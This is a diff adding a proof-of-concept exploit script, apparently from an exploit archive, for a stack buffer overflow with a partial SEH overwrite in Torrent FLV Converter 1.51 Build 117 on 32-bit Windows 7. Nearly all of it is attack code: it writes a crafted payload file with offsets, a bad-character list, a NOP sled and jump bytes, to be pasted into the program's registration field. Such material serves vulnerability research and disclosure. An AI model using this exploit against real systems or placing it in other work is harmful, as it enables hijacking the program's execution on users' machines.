@@ -1,0 +1,31 @@
+# Exploit Title: Torrent FLV Converter 1.51 Build 117 - Stack Oveflow (SEH partial overwrite)
+# Date: 2020-01-16
+# Exploit Author: antonio
+# Vendor Homepage: http://www.torrentrockyou.com/
+# Software Link: http://www.torrentrockyou.com/download/trflvconverter.exe
+# Version: 1.51 Build 117
+# Tested on: Windows 7 SP1 32-bit
+
+# Copy paste the contents of poc.txt into the
+# Registration Code input field.
+
+#!/usr/bin/python
+
+nseh_offset = 4500
+total = 5000
+
+# badchars
+# --------
+# 0x00, 0x0a, 0x0d, 0x80
+# 0xf0-x0ff, 0xe0-0x0ef, 0x70-0x7a
+# 0x61-0x6f, 0x9a, 0x9c, 0x9e
+
+poc = ""
+poc += "A"*(nseh_offset - 53)
+poc += "\x90"*53
+poc += "\x7d\xcb\x90\x90" # jump backwards to NOPs: jge via SF = OF
+poc += "\x7f\xb3\x45" # nseh pop pop ret: 3-byte partial overwrite
+
+file = open("poc_seh.txt","w")
+file.write(poc)
+file.close()
